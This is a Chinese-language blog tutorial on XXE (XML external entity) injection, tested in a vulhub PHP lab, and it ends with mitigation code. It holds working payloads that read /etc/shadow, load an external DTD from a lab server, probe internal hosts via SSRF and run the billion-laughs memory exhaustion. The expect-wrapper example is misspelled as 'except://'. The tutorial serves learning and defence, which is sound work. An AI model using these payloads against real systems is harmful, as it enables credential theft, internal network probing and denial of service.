---
layout:     post
title:      XML外部实体注入漏洞 (My first blog)
subtitle:   XML ExternalEntity Injection
date:       2018-07-25
author:     Jarrett0x
header-img: img/post-bg-debug.png
catalog: true
tags:
    - XXE
    - 漏洞
    - 学习
---

> 本文使用测试脚本以及环境地址：[https://github.com/vulhub/vulhub/tree/master/php/php_xxe](https://github.com/vulhub/vulhub/tree/master/php/php_xxe "PHP_XXE")

# 一、 什么是XML #
- `XML`用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。`XML`文档结构包括`XML`声明、`DTD`文档类型定义（可选）、文档元素。

## 文档结构 ##
- XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

		<!--XML声明-->
		<?xml version="1.0"?>
		<!--文档类型定义-->
		<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
		<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
		<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
		<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
		<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
		<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
		]]]>
		<!--文档元素-->
		<note>
		<to>Dave</to>
		<from>Tom</from>
		<head>Reminder</head>
		<body>You are a good man</body>
		</note>

## DTD(Document Type Definition) ##
- `XML`文档结构包括`XML`声明、`DTD`文档类型定义（可选）、文档元素。
- 内部声明`DTD`:

		<!DOCTYPE 根元素 [元素声明]>

- 引用外部`DTD`:

		<!DOCTYPE 根元素 SYSTEM "文件名">

- DTD中的一些重要的关键字：

		DOCTYPE（DTD的声明）
		ENTITY（实体的声明）
		SYSTEM、PUBLIC（外部资源申请）

### DTD实体声明 ###
- **1. 内部实体声明**：

		<!ENTITY 实体名称 “实体的值”>

- 一个实体由三部分构成:&符号, 实体名称, 分号 (;)，这里&不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&符号会被认为是参数间的连接符号，示例：

		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY xxe "Thinking">]>
		<root>
		<name>&xxe;</name>
		</root>

- 测试效果：

![post-builtin_res.png](/img/post-builtin_res.png)

![post-builtin_req.png](/img/post-builtin_req.png)

- **2. 外部实体声明**

		<!ENTITY 实体名称 SYSTEM "URI/URL">

- 外部实体默认协议：

![post-outprotocal.png](/img/post-outprotocal.png)

	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE xxe [
	<!ELEMENT name ANY >
	<!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
	<root>
	<name>&xxe;</name>
	</root>

- **3. 参数实体声明**

		<!ENTITY % 实体名称 “实体的值”>
		or
		<!ENTITY % 实体名称 SYSTEM “URI”>

- 示例：

		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY  % xxe SYSTEM "http://172.31.50.131:8000/evil.dtd" >
		%xxe;]>
		<root>
		<name>&evil;</name>
		</root>
- 外部evil.dtd中的内容：

		<!ENTITY evil SYSTEM "file:///etc/shadow">

- 测试效果：

![post-parameter_req.png](/img/post-parameter_req.png)

![post-parameter_res.png](/img/post-parameter_res.png)

- **4. 引用公共实体**

		<!ENTITY 实体名称 PUBLIC "public_ID" "URI">

# 二、 XXE漏洞 #
- `XML`外部实体注入漏洞， `XML ExternalEntity Injection`，简称 `XXE`

## 1. 读取系统文件/etc/shadow ##
- Payload1

		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
		<root>
		<name>&xxe;</name>
		</root>

- 测试效果
![post-XXEPayload1.png](/img/post-XXEPayload1.png)

![post-Response1.png](/img/post-Response1.png)

> Linux系统中，所有用户（包括系统管理员）的账号和密码都可以在/etc/passwd和/etc/shadow这两个文件中找到，（/etc/passwd只有系统管理员才可以修改的，其他用户可以查看，/etc/shadow其他用户看不了）
> **/etc/passwd：**
> 上面每一行都代表一个用户，每一行又通过[:]分为七个部分。
> 
	1、账号名称
	2、原先用来保存密码的，现在密码都放在/etc/shadow中，所以这里显示x
	3、UID，也就是使用者ID。默认的系统管理员的UID为0，我们添加用户的时候最好使用1000以上的UID，1-1000范围的UID最好保留给系统用。
	4、GID，也就是群组ID
	5、关于账号的一些说明信息（暂时可以忽略）
	6、账号的家目录，家目录就是你登陆系统后默认的那个目录
	7、账号使用的shell
> **/etc/shadow：**
> 这里也是由[:]来进行分割，但是这里一共分出来九个栏目，每个栏目的解释如下：
> 
	1、账户名称（密码需要与账户对应的嘛）
	2、加密后的密码（总不能学CSDN放明文密码，是吧），如果这一栏的第一个字符为!或者*的话，说明这是一个不能登录的账户，从上面可以看出，ubuntu默认的就不启用root账户。
	3、最近改动密码的日期（不是日期吗，咋是一堆数字，别急，这个是从1970年1月1日算起的总的天数）。那怎么才能知道今天距1970年1月1日有多少天呢？很简单，你改下密码，然后看下这个栏目中的数字是多少就可以了！
	4、密码不可被变更的天数：设置了这个值，则表示从变更密码的日期算起，多少天内无法再次修改密码，如果是0的话，则没有限制
	5、密码需要重新变更的天数：密码经常更换才能保证安全，为了提醒某些经常不更换密码的用户，可以设置一个天数，强制让用户更换密码，也就是说该用户的密码会在多少天后过期，如果为99999则没有限制
	6、密码过期预警天数：如果在5中设置了密码需要重新变更的天数，则会在密码过期的前多少天进行提醒，提示用户其密码将在多少天后过期
	7、密码过期的宽恕时间：如果在5中设置的日期过后，用户仍然没有修改密码，则该用户还可以继续使用的天数
	8、账号失效日期，过了这个日期账号就不能用了
	9、保留的


## 2. 命令执行 ##
- php环境下，xml命令执行要求php装有`expect`扩展。而该扩展默认没有安装。

		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY xxe SYSTEM "except://ls" >]>
		<root>
		<name>&xxe;</name>
		</root>

- 没安装

## 3. 内网探测(SSRF) ##
- `SSRF(Server-Side Request Forgery)`，服务器端请求伪造:

		1.内外网的端口和服务扫描
		2.主机本地敏感数据的读取
		3.内外网主机应用程序漏洞的利用
		4.内外网Web站点漏洞的利用 
		...

		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY xxe SYSTEM "http://172.31.50.131:8000/ssrf_test.txt" >]>
		<root>
		<name>&xxe;</name>
		</root>
		
		<?xml version="1.0" encoding="utf-8"?> 
		<!DOCTYPE xxe [
		<!ELEMENT name ANY >
		<!ENTITY xxe SYSTEM "https://172.31.50.1" >]>
		<root>
		<name>&xxe;</name>
		</root>

## 4. 拒绝服务攻击 ##
- `billion laughs`
- 该攻击通过创建一项递归的 `XML` 定义，在内存中生成十亿个`"Ha!"`字符串，从而导致 `DDoS` 攻击。
- 原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。

		<?xml version="1.0" encoding="utf-8"?>
		<!DOCTYPE lolz [
		<!ENTITY lol "lol">
		<!ELEMENT lolz (#PCDATA)>
		<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
		<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
		<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
		<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
		<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
		<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
		<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
		<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
		<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
		]>
		<lolz>&lol9;</lolz>

# 三、 修复方案 #
## 方案一：使用开发语言提供的禁用外部实体的方法 ##
- PHP

		libxml_disable_entity_loader(true);

- JAVA

		DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
		dbf.setExpandEntityReferences(false);
- Python

		from lxml import etree
		xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

## 方案二：过滤用户提交的XML数据 ##
- 过滤关键词：

		<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC

